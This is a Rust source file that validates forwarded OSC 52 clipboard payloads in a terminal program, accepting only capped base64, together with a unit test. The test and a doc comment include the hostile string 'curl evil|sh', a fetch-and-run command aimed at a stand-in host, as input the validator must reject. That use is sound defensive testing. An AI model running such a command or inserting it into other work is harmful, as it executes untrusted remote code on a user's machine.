//! The clipboard a program set (OSC 52), as both ends hold it.

use serde::{Deserialize, Deserializer, Serialize};

/// Most bytes in a forwarded clipboard (OSC 52), as mosh caps it; a larger one is dropped.
pub const MAXIMUM_CLIPBOARD_SIZE: usize = 16 * 1024;

/// A clipboard payload: base64 within [`MAXIMUM_CLIPBOARD_SIZE`], empty if none.
///
/// Made only by [`new`](Self::new), so the server's emulator, the client decoding a diff and the
/// client forwarding it to the user's terminal hold it to one rule. On the wire it is its string.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize)]
#[serde(transparent)]
pub struct Clipboard(String);

impl Clipboard {
    /// No clipboard set.
    pub const NONE: Self = Self(String::new());

    /// The clipboard `data` sets, or `None` for one to drop: over the cap, not base64, or a query
    /// (`?`), which asks for the clipboard and which koh never answers.
    pub fn new(data: &[u8]) -> Option<Self> {
        (data.len() <= MAXIMUM_CLIPBOARD_SIZE
            && data
                .iter()
                .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=')))
        .then(|| Self(String::from_utf8_lossy(data).into_owned()))
    }

    /// A diff's clipboard as decoded: one to drop is read as no change, whole, so what the client
    /// holds is never a cut one.
    pub(super) fn decode<'de, D: Deserializer<'de>>(wire: D) -> Result<Option<Self>, D::Error> {
        Ok(Option::<String>::deserialize(wire)?.and_then(|c| Self::new(c.as_bytes())))
    }

    pub fn as_str(&self) -> &str {
        &self.0
    }

    pub fn is_empty(&self) -> bool {
        self.0.is_empty()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// What is not base64 within the cap is dropped whole, never cut to fit: raw shell (`curl
    /// evil|sh`), a query (`?`, which would ask the user's terminal for their clipboard), one byte
    /// too many.
    #[test]
    fn only_base64_within_the_cap_is_a_clipboard() {
        let at_cap = "A".repeat(MAXIMUM_CLIPBOARD_SIZE);
        assert_eq!(
            Clipboard::new(at_cap.as_bytes()).map(|c| c.as_str().len()),
            Some(MAXIMUM_CLIPBOARD_SIZE)
        );
        assert_eq!(Clipboard::new(b"aGk=").unwrap().as_str(), "aGk=");
        assert_eq!(Clipboard::new(b""), Some(Clipboard::NONE));
        let over = "A".repeat(MAXIMUM_CLIPBOARD_SIZE + 1);
        for bad in [&b"curl evil|sh"[..], b"?", over.as_bytes(), "é".as_bytes()] {
            assert_eq!(Clipboard::new(bad), None);
        }
    }
}
